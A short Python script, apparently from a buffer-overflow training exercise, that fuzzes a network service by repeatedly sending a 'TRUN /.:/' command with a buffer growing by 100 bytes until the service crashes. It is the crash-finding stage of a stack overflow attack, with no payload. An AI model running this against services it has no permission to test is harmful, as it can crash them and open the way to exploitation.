import sys
import socket
from time import sleep

target_host = "127.0.0.1"  # Replace with the target IP address
target_port = 9999  # Replace with the target port

buffer = "TRUN /.:/"

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_host, target_port))
        print(f"Fuzzing with {len(buffer)} bytes")
        s.send(buffer.encode())
        response = s.recv(1024)
        print("Received:", response.decode())
        s.close()
        buffer += "A" * 100
        sleep(1)  # This is for delay
    except:
        print(f"Crashed at {len(buffer)} bytes")
        sys.exit(0) # to exit the script
